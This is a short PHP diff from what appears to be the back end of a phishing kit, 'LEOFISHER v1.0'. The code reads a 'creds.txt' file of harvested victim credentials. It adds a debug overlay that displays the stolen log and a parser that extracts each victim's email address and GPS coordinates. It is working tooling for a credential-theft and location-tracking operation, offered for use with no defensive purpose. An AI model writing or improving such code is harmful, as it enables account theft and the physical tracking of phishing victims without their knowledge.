@@ -3,6 +3,40 @@ date_default_timezone_set('Africa/Bujumbura');
 $creds_file = 'creds.txt';
 $victims = [];
 
+// === DEBUG : AFFICHE CONTENU EXACT ===
+echo "<pre style='position:absolute;top:10px;left:10px;background:black;color:lime;z-index:9999;padding:10px'>";
+if (file_exists($creds_file)) {
+    $logs = file_get_contents($creds_file);
+    echo "📄 TAILLE FICHIER: " . strlen($logs) . " octets\n";
+    echo "📄 DERNIÈRES 500 CARACTÈRES:\n" . substr($logs, -500) . "\n\n";
+} else {
+    echo "❌ creds.txt N'EXISTE PAS\n";
+}
+echo "</pre>";
+
+// TON PARSEUR EXACT
+if (file_exists($creds_file)) {
+    $logs = file_get_contents($creds_file);
+    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);
+
+    echo "<pre style='position:absolute;top:200px;left:10px;background:black;color:lime;z-index:9999;padding:10px'>";
+    echo "🔍 ENTRIES TROUVÉES: " . count($entries) . "\n";
+    
+    foreach ($entries as $i => $entry) {
+        if (strlen(trim($entry)) > 10) {
+            echo "ENTRY $i (" . strlen($entry) . " chars):\n" . substr($entry, 0, 200) . "...\n\n";
+            
+            if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
+                echo "✅ GPS trouvé: " . $gps_match[1] . "," . $gps_match[2] . "\n";
+            }
+            if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
+                echo "✅ EMAIL trouvé: " . $email_match[1] . "\n";
+            }
+        }
+    }
+    echo "</pre>";
+
+    // ... reste de ton code parsing ...
 // Parseur PRO - extrait TOUS GPS + infos depuis logs ASCII
 if (file_exists($creds_file)) {
     $logs = file_get_contents($creds_file);
